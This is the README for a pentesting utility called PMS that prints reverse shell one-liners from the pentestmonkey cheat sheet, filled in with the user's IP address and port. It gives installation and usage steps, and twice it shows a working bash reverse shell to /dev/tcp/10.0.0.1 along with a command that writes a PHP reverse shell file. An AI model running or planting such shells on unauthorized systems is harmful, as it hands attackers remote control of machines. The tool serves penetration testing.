# PMS
PMS - Print My Shell

PMS will help you get you revers shell filled with you IP and port number.\
It's contains [pentestmonkey revers shell cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) shells.

Install
----------------
```sh
$ git clone https://github.com/etrock/PMS.git
$ cd PMS
```
Change ```ethernet_interface``` name in ```pms.conf```. The default is ```eth1```
```
[default]

# default ethernet interface name
ethernet_interface = eth1 
```

You can add to your ~/.bashrc file
```
alias pms='python3 "<pms path>/pms.py"'
source ~/.bashrc
```
and now you can use like :
```sh
$ pms bash
bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
```

Configuration
----------------
In ```pms.conf``` file you can set your  ```ethernet_interface``` name, ```ip``` address or ```port``` number\
If your ```ip``` address is set in the conf file it won't use the ```ethernet_interface``` address\
You can specify your ```ip``` address or ```port``` number as an argument too.

Arguments
-----------------
```type```: **required**, reverse shell type , (eg. "bash")\
```-c --config```: *optional* , configuration file , ```<default> pms.conf```\
```-h --host```: *optional*, host IP address\
```-p --port```: *optional* port number

shell types : bash, perl, python, php (shell), ruby, nc, nc-2, java, php-rev (file)


Usage
----------------
Don't forget to edit your ```pms.conf``` file
```sh
$ python3 pms.py bash
bash -i >& /dev/tcp/10.0.0.1/1111 0>&1
```
Get php reverse shell file
```sh
$ python3 pms.py php-rev > shell.php
```
